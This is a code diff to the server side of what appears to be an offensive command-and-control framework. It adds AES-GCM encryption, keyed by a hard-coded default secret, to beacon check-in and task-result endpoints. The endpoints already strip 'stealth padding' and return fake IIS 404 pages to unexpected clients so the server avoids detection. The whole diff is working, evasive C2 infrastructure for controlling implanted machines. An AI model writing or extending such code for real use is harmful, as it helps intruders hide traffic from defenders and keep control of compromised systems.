@@ -5,11 +5,55 @@ Real beacon check-in/task/result endpoints
 from flask import Blueprint, request, jsonify, session, Response
 from datetime import datetime
 import struct
+import os
+import json
+import base64
+import hashlib
+
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    HAS_AES_GCM = True
+except ImportError:
+    HAS_AES_GCM = False
 
 from cybermodules.c2_beacon import get_beacon_manager
 from cybermodules.payload_generator import get_payload_generator
 
 beacon_bp = Blueprint("beacon", __name__)
+
+NETWORK_SHARED_SECRET = os.environ.get("MONOLITH_NETWORK_SECRET", "MonolithC2TransientSecret2026")
+
+
+def _derive_network_key(beacon_id: str) -> bytes:
+    """Derive AES-256 key for network transit encryption"""
+    return hashlib.sha256((beacon_id + NETWORK_SHARED_SECRET).encode()).digest()
+
+
+def _decrypt_beacon_payload(beacon_id: str, raw_data: bytes) -> bytes:
+    """Decrypt AES-256-GCM encrypted beacon payload"""
+    if not HAS_AES_GCM or not raw_data:
+        return raw_data
+    try:
+        raw = base64.b64decode(raw_data)
+        nonce = raw[:12]
+        ciphertext = raw[12:]
+        aesgcm = AESGCM(_derive_network_key(beacon_id))
+        return aesgcm.decrypt(nonce, ciphertext, None)
+    except Exception:
+        return raw_data
+
+
+def _encrypt_c2_response(beacon_id: str, data: bytes) -> bytes:
+    """Encrypt C2 response with AES-256-GCM"""
+    if not HAS_AES_GCM or not beacon_id:
+        return data
+    try:
+        nonce = os.urandom(12)
+        aesgcm = AESGCM(_derive_network_key(beacon_id))
+        ciphertext = aesgcm.encrypt(nonce, data, None)
+        return base64.b64encode(nonce + ciphertext)
+    except Exception:
+        return data
 
 
 def strip_stealth_padding(raw_data: bytes) -> tuple:
@@ -46,31 +90,40 @@ def strip_stealth_padding(raw_data: bytes) -> tuple:
 @beacon_bp.route("/c2/beacon/checkin", methods=["POST"])
 def beacon_checkin():
     """
-    Beacon check-in endpoint with stealth padding support.
+    Beacon check-in endpoint with stealth padding and network encryption support.
     Returns IIS 10.0 style 404 for anomalous clients to avoid detection.
     """
     raw_data = request.get_data()
     clean_data, _ = strip_stealth_padding(raw_data)
-    
+
     if clean_data is None:
         return Response(
             "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
             status=404,
             mimetype="text/html"
         )
-    
+
     try:
+        # Decrypt if beacon used network encryption
+        beacon_id = request.headers.get("X-Monolith-Beacon-Id")
+        if beacon_id and request.headers.get("X-Monolith-Encrypted") == "v1":
+            clean_data = _decrypt_beacon_payload(beacon_id, clean_data)
+
         import json
         data = json.loads(clean_data) if clean_data else {}
         remote_ip = request.remote_addr
-        
+
         manager = get_beacon_manager()
         response = manager.handle_checkin(data, remote_ip)
-        
-        padding = b"A" * (struct.unpack("<I", raw_data[:4] if raw_data else b"\x00\x00\x00\x00")[0] % 256 + 64) if raw_data else b""
-        
+
+        # Encrypt response if this is an existing beacon with a stored key
+        response_body = json.dumps(response).encode()
+        existing_beacon = data.get('id') and manager.get_beacon(data.get('id')) is not None
+        if beacon_id and existing_beacon:
+            response_body = _encrypt_c2_response(beacon_id, response_body)
+
         return Response(
-            json.dumps(response),
+            response_body,
             status=200,
             mimetype="application/json"
         )
@@ -85,26 +138,33 @@ def beacon_checkin():
 @beacon_bp.route("/c2/beacon/result/<beacon_id>", methods=["POST"])
 def beacon_result(beacon_id: str):
     """
-    Receive task result from beacon with stealth padding support.
+    Receive task result from beacon with stealth padding and network encryption support.
     """
     raw_data = request.get_data()
     clean_data, _ = strip_stealth_padding(raw_data)
-    
+
     if clean_data is None:
         return Response(
             "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
             status=404,
             mimetype="text/html"
         )
-    
+
     try:
+        # Decrypt if beacon used network encryption
+        if request.headers.get("X-Monolith-Encrypted") == "v1":
+            clean_data = _decrypt_beacon_payload(beacon_id, clean_data)
+
         import json
         data = json.loads(clean_data) if clean_data else {}
-        
+
         manager = get_beacon_manager()
         response = manager.handle_result(beacon_id, data)
-        
-        return jsonify(response)
+
+        response_body = json.dumps(response).encode()
+        response_body = _encrypt_c2_response(beacon_id, response_body)
+
+        return Response(response_body, status=200, mimetype="application/json")
     except Exception as e:
         return Response(
             "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
